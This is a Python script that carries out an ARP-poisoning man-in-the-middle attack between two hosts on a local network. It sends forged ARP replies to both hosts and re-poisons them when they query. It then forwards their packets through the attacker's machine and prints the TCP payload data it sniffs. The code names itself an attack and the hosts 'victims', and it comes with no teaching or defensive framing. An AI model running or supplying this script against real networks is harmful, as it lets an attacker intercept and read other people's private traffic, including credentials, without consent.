from threading import Thread
from struct import pack, unpack
import subprocess
import socket
import re
import ipaddress


# ARPs for the mac address of an IP
def get_mac(ip):
    mac = str(subprocess.check_output(['arping', '-f', '-I', net_device, ip]))
    mac = re.search(r'([0-9A-F]{2}[:]){5}([0-9A-F]{2})', mac).group(0)
    return pack('!6B', *[int(x, 16) for x in mac.split(':')])


# Prompt for network device
ifconfig_info = subprocess.check_output(['ifconfig']).decode('utf-8')
print(ifconfig_info)
net_device = input('Select network device: ')

# Prompts for host IP's
ip1_unpacked = input("Host1's IP: ")
ip2_unpacked = input("Host2's IP: ")
ip1 = pack('!4B', *[int(x) for x in ip1_unpacked.split('.')])
ip2 = pack('!4B', *[int(x) for x in ip2_unpacked.split('.')])

# ARPs for host mac addresses
mac1 = get_mac(ip1_unpacked)
mac2 = get_mac(ip2_unpacked)

# Sets up socket to send ARP reply
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s.bind((net_device, socket.SOCK_RAW))

# This computers ip and mac address
ip_cmd = ['ip', 'address', 'show', 'dev', net_device]
ip_info = str(subprocess.check_output(ip_cmd))
regex = net_device + r'.*inet ([0-9.]+)'
my_ip = re.findall(regex, ip_info)[0]
my_mac = s.getsockname()[4]


# Creates an arp packet
def make_arp(target_ip, target_mac, sender_ip, sender_mac):
    arp_packet = [
        # Ethernet Header
        target_mac,  # Destination mac address
        my_mac,  # sender_mac,#Source mac address
        pack('>H', 0x0806),  # Protocol type (ARP = 0x0806)

        # ARP Header
        pack('>H', 0x0001),  # Hardware type (Ethernet(10 Mb) = 1)
        pack('>H', 0x0800),  # Protocol type (IP = 0x0800)
        pack('>B', 0x06),  # Mac address length
        pack('>B', 0x04),  # Ip address length
        pack('>H', 0x0002),  # Opcode (ARP reply = 2)
        sender_mac,  # Sender mac address
        sender_ip,  # Sender ip address
        target_mac,  # Target mac address
        target_ip  # Target ip address
    ]
    return b''.join(arp_packet)


# Creates the two malicious ARP packets
arp1 = make_arp(ip1, mac1, ip2, my_mac)
arp2 = make_arp(ip2, mac2, ip1, my_mac)


# Starts the man in the middle attack
def poison_arp():
    s.send(arp1)
    s.send(arp2)


# Ends the man in the middle attack quietly
def restore_connection():
    arp1 = make_arp(ip1, mac1, ip2, mac2)
    arp2 = make_arp(ip2, mac2, ip1, mac1)
    s.send(arp1)
    s.send(arp2)
    s.close()


# Boolean to determine when to stop attacking
attacking = True


# Sniffer
def listen_to_incoming_packets(Host_One_IP, Host_Two_IP,
                               Host_One_MAC, Host_Two_MAC):
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    s.bind((net_device, socket.SOCK_RAW))

    # MACs unpacked
    H1_MAC_unp = unpack('>6s', Host_One_MAC)[0]
    H2_MAC_unp = unpack('>6s', Host_Two_MAC)[0]

    while attacking:
        packet = s.recvfrom(65565)
        packet = packet[0]
        ethernet_length = 14
        eth_header = packet[:ethernet_length]  # Ethernet header is 14 bytes
        unpacked_eth = unpack('>6s6sH', eth_header)
        #  unpacked_eth:
        # -----------------
        #  index:
        #   0 -  Destination MAC Address (48 bits)
        #   1 - Source MAC Address (48 bits)
        #   2 - EtherType (16 bits)
        dstMAC = unpacked_eth[0]
        srcMAC = unpacked_eth[1]
        etherType = unpacked_eth[2]
        if etherType == 0x0806:
            arp_header = packet[ethernet_length:ethernet_length+28]
            arp_unpacked = unpack('>HHBBH6s4s6s4s', arp_header)
            opcode = arp_unpacked[4]
            sender_ip = socket.inet_ntoa(arp_unpacked[6])
            target_ip = socket.inet_ntoa(arp_unpacked[8])

            send_arp1 = sender_ip == Host_One_IP and target_ip == Host_Two_IP
            send_arp2 = sender_ip == Host_Two_IP and target_ip == Host_One_IP
            if opcode == 0x0001 and send_arp1:
                s.send(arp1)
            elif opcode == 0x0001 and send_arp2:
                s.send(arp2)
        else:
            ip_header = packet[ethernet_length:ethernet_length+20]
            unpacked_iph = unpack('>BBHHHBBH4s4s', ip_header)
            #  unpacked_iph:
            # -----------------
            #  index:
            #   0 -  Version [0000]  IP Header Length [0000] (8 bits)
            #   1 - Type of Service (8 bits)
            #   2 - Size of Datagram (16 bits)
            #   3 - Identification (16 bits)
            #   4 - Flags [000] Fragmentation Offset [13 bits] (16 bits)
            #   5 - TTL (8 bits)
            #   6 - Protocol (8 bits)
            #   7 - Checksum (16 bits)
            #   8 - Source IP (32 bits)
            #   9 - Destination IP (32 bits)

            ip_header_length = (unpacked_iph[0] & 0xF) * 4
            srcIP = socket.inet_ntoa(unpacked_iph[8])
            dstIP = socket.inet_ntoa(unpacked_iph[9])
            srcIP_obj = ipaddress.ip_address(srcIP)
            dstIP_obj = ipaddress.ip_address(dstIP)

            # Checks on IP
            is_global = srcIP_obj.is_global and dstIP_obj.is_global
            is_multi = srcIP_obj.is_multicast or dstIP_obj.is_multicast
            dst_not_me = (dstIP != my_ip)
            ip_ok = not is_global and not is_multi and dst_not_me
            # Checks on MAC and broadcast
            dst_not_bcast = (dstIP != '255.255.255.255' and dstIP != '0.0.0.0')
            src_not_bcast = (srcIP != '255.255.255.255' and srcIP != '0.0.0.0')
            mac_not_bcast = (dstMAC != 'FF:FF:FF:FF:FF:FF')
            victim_mac = (srcMAC == H1_MAC_unp or srcMAC == H2_MAC_unp)
            not_bcast = (dst_not_bcast and src_not_bcast and mac_not_bcast)
            mac_ok = (not_bcast and victim_mac)

            # Forward packet to victim
            new_dst_MAC = None
            if srcMAC == H1_MAC_unp and ip_ok and mac_ok:
                new_dst_MAC = Host_Two_MAC
            elif srcMAC == H2_MAC_unp and ip_ok and mac_ok:
                new_dst_MAC = Host_One_MAC
            # Reconstruct packet with actual MAC
            if new_dst_MAC is not None:
                new_packet = [new_dst_MAC, packet[6:]]
                try:
                    s.send(b''.join(new_packet))
                except:
                    print('Failed to send a package.')

            ethAndIP_len = ethernet_length+ip_header_length
            tcp_header = packet[ethAndIP_len:ethAndIP_len+20]
            unpacked_tcp = unpack('>HHLLBBHHH', tcp_header)
            #  unpacked_tcp:
            # -----------------
            #  index:
            #   0 -  Source Port (16 bits)
            #   1 - Destination Port (16 bits)
            #   2 - Sequence Number (32 bits)
            #   3 - Acknowlegement Number (32 bits)
            #   4 - Data Offset [0000] Reserved [0000] (8 bits)
            #   5 - Reserved [00] Control Bits [000000] (8 bits)
            #   6 - Window (16 bits)
            #   7 - Checksum (16 bits)
            #   8 - Urgent Pointer (16 bits)

            srcPort = unpacked_tcp[0]
            dstPort = unpacked_tcp[1]
            tcp_header_length = (unpacked_tcp[4] >> 4) * 4

            header_size = ethAndIP_len + tcp_header_length

            data = packet[header_size:]
            if len(data) > 0 and (ip_ok and mac_ok):
                try:
                    data_string = data.decode('utf-8')
                except:
                    data_string = str(data)
                print('SrcIP: ' + str(srcIP) + ' SrcPort: ' + str(srcPort)
                      + ' DestIP: ' + str(dstIP) + ' DestPort: ' + str(dstPort)
                      + '\nData: ' + data_string)


# Starts the packet sniffer thread
def start_sniffer():
    args = (ip1_unpacked, ip2_unpacked, mac1, mac2)
    Thread(target=listen_to_incoming_packets, args=args).start()


# Used to end the attack
def poll_console():
    print("Type q to quit...")
    input()
    print("exiting...")
    global attacking
    restore_connection()
    attacking = False


# Starts the man in the middle attack
Thread(target=poll_console).start()
start_sniffer()
poison_arp()
